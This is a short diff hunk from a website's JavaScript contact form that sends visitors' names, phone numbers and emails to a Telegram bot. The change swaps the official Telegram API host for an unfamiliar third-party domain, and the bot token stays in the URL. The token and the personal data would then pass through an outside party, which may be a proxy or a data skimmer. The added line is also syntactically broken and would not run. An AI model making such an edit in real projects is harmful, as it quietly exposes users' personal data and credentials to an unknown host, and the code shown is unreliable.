@@ -1165,7 +1165,7 @@
                     const message = `🔔 Новая заявка с сайта!\n\n👤 Имя: ${name.value.trim()}\n📞 Телефон: ${phone.value.trim()}\n📧 Email: ${email ? email.value.trim() : 'не указан'}`;
 
                     // Отправка в Telegram
-                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    fetch(`https://tg.i-i-a.link/bot${BOT_TOKEN}/sendMessage`, { ... })
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
                         body: JSON.stringify({
